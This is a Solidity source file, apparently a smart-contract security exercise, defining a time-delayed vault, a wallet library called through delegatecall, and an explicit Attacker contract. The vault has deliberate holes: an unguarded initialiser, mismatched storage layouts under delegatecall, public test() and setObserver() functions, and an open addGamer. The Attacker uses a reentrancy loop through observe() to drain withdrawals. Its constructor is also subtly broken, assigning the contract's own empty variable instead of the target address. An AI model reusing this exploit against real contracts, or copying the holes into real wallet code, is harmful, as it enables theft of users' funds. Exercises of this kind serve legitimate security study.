pragma solidity ^0.4.17;

contract GamerVerifier {
    mapping(address => uint256) public gamers;
    address owner;

    function GamerVerifier() {
        owner = msg.sender;
    }

    function addGamer(address addr, uint magic) {
        gamers[addr] = 1;
    }

    function isValidGamer(address gamer) view returns (bool) {
        return (gamers[gamer] == 1);
    }
}

contract CommonWalletLibrary {
    uint  public nextWithdrawTime;
    uint  public withdrawCoolDownTime;
    address[] public authorizedUsers;
    address public withdrawObserver;
    address public additionalAuthorizedContract;
    address public proposedAAA;
    uint public lastUpdated;
    bool[] public votes;
    address[] public observerHistory;
    GamerVerifier public g = GamerVerifier(0x0);
    address owner;
    address walletLibrary;

    modifier onlyOnce() {
        require(owner == 0x0);
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function addToReserve() payable recordAction external returns (uint) {
        require(g.isValidGamer(msg.sender));
        require(msg.value > 3 ether);
        return address(this).balance;
    }

    function initilzeVault() onlyOnce {
        lastUpdated = now;
        owner = msg.sender;
    }

    function basicWithdraw() {
        // amountToWithdraw = 0.01 ether;
        additionalAuthorizedContract.call.value(0.001 ether)();
    }

    function resolve() {
        require(msg.sender == owner);
        if (now >= lastUpdated + 16 hours) {
            selfdestruct(owner);
        }
    }

    modifier recordAction() {
        lastUpdated = now;
        _;
    }
}

contract TimeDelayedVault is CommonWalletLibrary {
    uint  public nextWithdrawTime;
    uint  public withdrawCoolDownTime;
    address[] public authorizedUsers;
    address public withdrawObserver;
    address public additionalAuthorizedContract;
    address public proposedAAA;
    uint public lastUpdated;
    bool[] public votes;
    address[] public observerHistory;
    GamerVerifier public g = GamerVerifier(0x0);
    address owner;
    address walletLibrary;
    uint public time;
    bool public initRet;

    function TimeDelayedVault(address libAddress) recordAction {
        nextWithdrawTime = now;
        withdrawCoolDownTime = 30 minutes;
        walletLibrary = libAddress;
        authorizedUsers.push(0xca35b7d915458ef540ade6068dfe2f44e8fa733c);
        for (uint i = 0; i < authorizedUsers.length; i++) {
            votes.push(false);
        }
        // initilizeVault
        address(this).call(bytes4(sha3("initializeVault()")));
    }

    modifier onlyAuthorized() {
        bool pass = false;
        if (additionalAuthorizedContract == msg.sender) {
            pass = true;
        }

        for (uint i = 0; i < authorizedUsers.length; i++) {
            if (authorizedUsers [i] == msg.sender) {
                pass = true;
                break;
            }
        }
        require(pass);
        _;
    }

    modifier onlyOnce() {
        require(owner == 0x0);
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    modifier recordAction() {
        lastUpdated = now;
        _;
    }

    function setObserver(address ob) {
        bool duplicate = false;
        for (uint i = 0; i < observerHistory.length; i++) {
            if (observerHistory[i] == ob) {
                duplicate = true;
            }
        }

        if (!duplicate) {
            withdrawObserver = ob;
            observerHistory.push(ob);
        }
    }

    function addToReserve() payable recordAction external returns (uint) {
        require(g.isValidGamer(msg.sender));
        assert(msg.value > 0.01 ether);
        return this.balance;
    }

    // 1024 * 0.01 - gas
    function withdrawFund() onlyAuthorized external returns (bool) {
        // evm stack deepth 1024
        require(now > nextWithdrawTime);
        assert(withdrawObserver.call(bytes4(sha3("observe()"))));
        walletLibrary.delegatecall(bytes4(sha3("basicWithdraw()")));
        nextWithdrawTime = nextWithdrawTime + withdrawCoolDownTime;
        return true;
    }

    function checkAllVote() private returns (bool) {
        for (uint i = 0; i < votes.length; i++) {
            if (!votes[i]) {
                return false;
            }
        }

        return true;
    }

    function clearVote() private {
        for (uint i = 0; i < votes.length; i++) {
            votes[i] = false;
        }
    }

    function addAuthorizedAccount(uint votePosition, address proposal) onlyAuthorized external {
        require(votePosition < authorizedUsers.length);
        require(msg.sender == authorizedUsers[votePosition]);
        if (proposal != proposedAAA) {
            clearVote();
            proposedAAA = proposal;
        }

        votes[votePosition] = true;
        if (checkAllVote()) {
            additionalAuthorizedContract = proposedAAA;
            clearVote();
        }
    }

    function test() {
        assert(withdrawObserver.call(bytes4(sha3("observe()"))));
        walletLibrary.delegatecall(bytes4(sha3("basicWithdraw()")));
    }

    function resolve() onlyOwner {
        walletLibrary.delegatecall(bytes4(sha3("resolve()")));
    }

    function initilizeVault() onlyOnce {
        time++;
        lastUpdated = now;
        owner = msg.sender;
    }
}

contract Attacker {
    uint public time;
    TimeDelayedVault dao;

    function Attacker(address a) {
        dao = TimeDelayedVault(dao);
    }

    function observe() {
        time++;
        if (time < 10) {
            dao.test();
        }
    }

    function attack() {
        dao.setObserver(this);
        dao.test();
    }
}
